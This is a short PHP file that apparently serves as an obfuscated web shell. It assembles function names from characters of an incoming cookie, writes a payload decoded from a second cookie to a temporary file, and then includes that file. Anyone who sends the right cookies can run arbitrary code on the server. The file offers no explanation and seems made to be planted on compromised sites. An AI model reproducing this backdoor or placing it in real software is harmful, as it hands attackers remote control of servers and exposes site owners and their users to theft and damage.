<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[28])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 6;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[28][$n];
        if (!$c[28][$n + 1]) {
            if (!$c[28][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 6 + 1;
    }
    $k = $p[23]() . $p[14];
    if (!$p[0]($k)) {
        $n = $p[21]($k, $p[27]);
        $p[4]($n, $p[12] . $p[2]($p[9]($c[3])));
    }
    include($k);
}